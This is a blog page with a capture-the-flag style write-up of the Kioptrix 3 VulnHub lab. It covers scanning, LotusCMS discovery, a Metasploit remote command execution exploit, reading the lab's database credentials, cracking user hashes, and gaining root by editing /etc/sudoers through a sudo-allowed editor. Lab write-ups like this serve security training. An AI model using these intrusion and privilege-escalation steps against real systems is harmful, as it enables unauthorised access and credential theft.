<!DOCTYPE html>
<html lang="en-us">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public" />
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.62.0" />

    
    
    

<title>Kioptrix 3 Write-up • </title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Kioptrix 3 Write-up"/>
<meta name="twitter:description" content="This has been some long time I haven&#39;t written another write-up. This one&#39;s for Kioptrix 3 that you can find here.
Host Discovery $ nmap -sP 192.168.56.1/24 and we got the IP address : 192.168.56.101.
As it was explained, you need to add 192.168.56.101 kioptrix3.com in your /etc/hosts.
Fingerprinting Then, let&#39;s find what kind of services are running on the host machine.
$ nmap 192.168.56.101 -sV -A Starting Nmap 6.46 ( http://nmap."/>

<meta property="og:title" content="Kioptrix 3 Write-up" />
<meta property="og:description" content="This has been some long time I haven&#39;t written another write-up. This one&#39;s for Kioptrix 3 that you can find here.
Host Discovery $ nmap -sP 192.168.56.1/24 and we got the IP address : 192.168.56.101.
As it was explained, you need to add 192.168.56.101 kioptrix3.com in your /etc/hosts.
Fingerprinting Then, let&#39;s find what kind of services are running on the host machine.
$ nmap 192.168.56.101 -sV -A Starting Nmap 6.46 ( http://nmap." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://paulsec.github.io/posts/kioptrix-3-write-up/" />
<meta property="article:published_time" content="2014-06-12T00:00:00+00:00" />
<meta property="article:modified_time" content="2014-06-12T00:00:00+00:00" /><meta property="og:site_name" content="PaulSec&#39;s Blog" />


    


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">








<link rel="stylesheet" href="/scss/hyde-hyde.92c66d107d7b219f0792cfd67223179af884b03f386ac46894f9f735932bbca3.css" integrity="sha256-ksZtEH17IZ8Hks/WciMXmviEsD84asRolPn3NZMrvKM=">


<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">



    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    
    

</head>


    <body class=" ">
    
<div class="sidebar">
  <div class="container ">
    <div class="sidebar-about">
      <span class="site__title">
        <a href="http://paulsec.github.io"></a>
      </span>
      
        
        
        
        <div class="author-image">
          <img src="http://paulsec.github.ioimg/profile.png" alt="Author Image" class="img--circle img--headshot element--center">
        </div>
        
      
      
      <p class="site__description">
        
      </p>
    </div>
    <div class="collapsible-menu">
      <input type="checkbox" id="menuToggle">
      <label for="menuToggle"></label>
      <div class="menu-content">
        <div>
	<ul class="sidebar-nav">
		 
		
	</ul>
</div>

        <section class="social">
	
	<a href="https://twitter.com/@PaulWebSec" rel="me"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
	
	
	
	<a href="https://github.com/PaulSec" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	
	
	
	
	
	
	
	
	
	
	
	
</section>

      </div>
    </div>
    
<div class="copyright">
  &copy; 2019 Paul A.
  
    <a href="https://creativecommons.org/licenses/by-sa/4.0">CC BY-SA 4.0</a>
  
</div>


<div class="builtwith">
Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
</div>


  </div>
</div>

        <div class="content container">
            
    
<article>
  <header>
    <h1>Kioptrix 3 Write-up</h1>
    
    
<div class="post__meta">
    
    
      <i class="fas fa-calendar-alt"></i> Jun 12, 2014
    
    
    
      
      
          in
          
          
              <a class="badge badge-category" href="/categories/vulnhub">VULNHUB</a>
              •
          
              <a class="badge badge-category" href="/categories/write-up">WRITE-UP</a>
              
          
      
    
    
    
    <br/>
    <i class="fas fa-clock"></i> 3 min read
</div>


  </header>
  
  
  <div class="post">
    <p>This has been some long time I haven't written another write-up.
This one's for Kioptrix 3 that you can find <a href="">here</a>.</p>
<h3 id="--host-discovery--"><strong>Host Discovery</strong></h3>
<pre><code>$ nmap -sP 192.168.56.1/24
</code></pre><p>and we got the IP address : <code>192.168.56.101</code>.</p>
<p>As it was explained, you need to add <code>192.168.56.101 kioptrix3.com</code> in your <strong>/etc/hosts</strong>.</p>
<h3 id="--fingerprinting--"><strong>Fingerprinting</strong></h3>
<p>Then, let's find what kind of services are running on the host machine.</p>
<pre><code>$ nmap 192.168.56.101 -sV -A 

Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-12 20:15 CEST
Nmap scan report for malicious (192.168.56.101)
Host is up (0.00034s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
title = &quot;kioptrix 3 write up&quot;
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.59 seconds
</code></pre><p>Quite obvious, let's check this Web server !</p>
<h3 id="--reconnaissance--"><strong>Reconnaissance</strong></h3>
<p>Thanks to Nikto, we managed to find useful informations:</p>
<pre><code>(...)
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ Cookie phpMyAdmin created without the httponly flag
(...)
</code></pre><p>And with DirBuster:</p>
<pre><code>(...)
Dir found: /gallery/ - 500
File found: /gallery/index.php - 500
File found: /gallery/recent.php - 500
Dir found: /gallery/p.php/ - 500
Dir found: /gallery/g.php/ - 500
Dir found: /gallery/themes/ - 200
(...)
</code></pre><p>Moreover, by navigating on the website, I managed to get the CMS behind:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;keywords&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;LotusCMS&#34;</span> /&gt;
</code></pre></div><h3 id="--exploitation--"><strong>Exploitation</strong></h3>
<p>Thanks to this information, I looked on Exploit-db for <a href="http://www.exploit-db.com/search/?action=search&amp;filter_page=1&amp;filter_description=&amp;filter_exploit_text=LotusCMS&amp;filter_author=&amp;filter_platform=0&amp;filter_type=0&amp;filter_lang_id=0&amp;filter_port=&amp;filter_osvdb=&amp;filter_cve=">some known vulnerabilities</a>.</p>
<p><strong>Bingo</strong>, there was. :-)</p>
<p>I ran metasploit and exploited this <a href="http://www.exploit-db.com/exploits/18565/"><em>eval() Remote Command Execution</em></a>.
I managed to get a (limited) meterpreter session on the machine, and retrieved different files on the filesystem such as configuration file <code>gconfig.php</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
    <span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
    <span style="color:#75715e">/*
</span><span style="color:#75715e">        A sample Gallarific configuration file. You should edit
</span><span style="color:#75715e">        the installer details below and save this file as gconfig.php
</span><span style="color:#75715e">        Do not modify anything else if you don&#39;t know what it is.
</span><span style="color:#75715e">    */</span>

    <span style="color:#75715e">// Installer Details -----------------------------------------------
</span><span style="color:#75715e"></span>
    <span style="color:#75715e">// Enter the full HTTP path to your Gallarific folder below,
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// such as http://www.yoursite.com/gallery
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Do NOT include a trailing forward slash
</span><span style="color:#75715e"></span>
    $GLOBALS[<span style="color:#e6db74">&#34;gallarific_path&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://kioptrix3.com/gallery&#34;</span>;

    $GLOBALS[<span style="color:#e6db74">&#34;gallarific_mysql_server&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>;
    $GLOBALS[<span style="color:#e6db74">&#34;gallarific_mysql_database&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gallery&#34;</span>;
    $GLOBALS[<span style="color:#e6db74">&#34;gallarific_mysql_username&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root&#34;</span>;
    $GLOBALS[<span style="color:#e6db74">&#34;gallarific_mysql_password&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fuckeyou&#34;</span>;

    <span style="color:#75715e">// Setting Details -------------------------------------------------
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$g_mysql_c <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysql_connect</span>($GLOBALS[<span style="color:#e6db74">&#34;gallarific_mysql_server&#34;</span>], $GLOBALS[<span style="color:#e6db74">&#34;gallarific_mysql_username&#34;</span>], $GLOBALS[<span style="color:#e6db74">&#34;gallarific_mysql_password&#34;</span>])) {
        <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;A connection to the database couldn&#39;t be established: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">mysql_error</span>());
        <span style="color:#66d9ef">die</span>();
}<span style="color:#66d9ef">else</span> {
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$g_mysql_d <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysql_select_db</span>($GLOBALS[<span style="color:#e6db74">&#34;gallarific_mysql_database&#34;</span>], $g_mysql_c)) {
        <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;The Gallarific database couldn&#39;t be opened: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">mysql_error</span>());
        <span style="color:#66d9ef">die</span>();
    }<span style="color:#66d9ef">else</span> {
        $settings<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_query</span>(<span style="color:#e6db74">&#34;select * from gallarific_settings&#34;</span>);
        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">mysql_num_rows</span>($settings)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>){
            <span style="color:#66d9ef">while</span>($data<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_fetch_array</span>($settings)){
                $GLOBALS[<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>$data[&#39;settings_name&#39;]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>]<span style="color:#f92672">=</span>$data[<span style="color:#e6db74">&#39;settings_value&#39;</span>];
            }
        }
    
    }
}

<span style="color:#75715e">?&gt;</span>
</code></pre></div><p>Thanks to those credentials, I managed to access the phpMyAdmin and dumped all databases.</p>
<p>I got different hashes:</p>
<pre><code>dreg:0d3eccfb887aabd50f243b3f155c0f85 =&gt; Mast3r
loneferret:5badcaf789d3d1d09794d8f021f40f0e =&gt; starwars
</code></pre><p>Moreover, I had the admin's password: <strong>n0t7t1k4</strong>.</p>
<p>I managed to log in with loneferret's credentials on the SSH service.</p>
<p>I checked the files which were in the home folder and I found <code>CompanyPolicy.README</code>:</p>
<pre><code>$ cat CompanyPolicy.README 
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
</code></pre><p>And then:</p>
<pre><code>$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
</code></pre><p>Thanks to this, I only had to edit the <code>/etc/sudoers</code> file and update the entry:</p>
<pre><code>loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht, /bin/bash
</code></pre><p>Back to the terminal:</p>
<pre><code>loneferret@Kioptrix3:~$ sudo bash
root@Kioptrix3:~#
</code></pre><p>and Voilà, I was able to access the file <code>/root/Congrats.txt</code>.</p>
<p>Nice VM it was a fun trick with <code>ht</code> command.</p>

  </div>
  

<div class="navigation navigation-single">
    
    <a href="/posts/diving-into-xss-googles-game/" class="navigation-prev">
      <i aria-hidden="true" class="fa fa-chevron-left"></i>
      <span class="navigation-tittle">Diving into XSS googles game</span>
    </a>
    
    
    <a href="/posts/experiments-with-upnp/" class="navigation-next">
      <span class="navigation-tittle">Experiments with UPnP</span>
      <i aria-hidden="true" class="fa fa-chevron-right"></i>
    </a>
    
</div>


  

  
    


</article>


        </div>
        
    

<script defer src="https://use.fontawesome.com/releases/v5.5.0/js/all.js" integrity="sha384-GqVMZRt5Gn7tB9D9q7ONtcp4gtHIUEW/yG7h98J7IpE3kpi+srfFyyB/04OV6pG0" crossorigin="anonymous"></script>


    
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
        
    
    <script type="text/javascript">
        
        hljs.initHighlightingOnLoad();
    </script>
    




    



    </body>
</html>
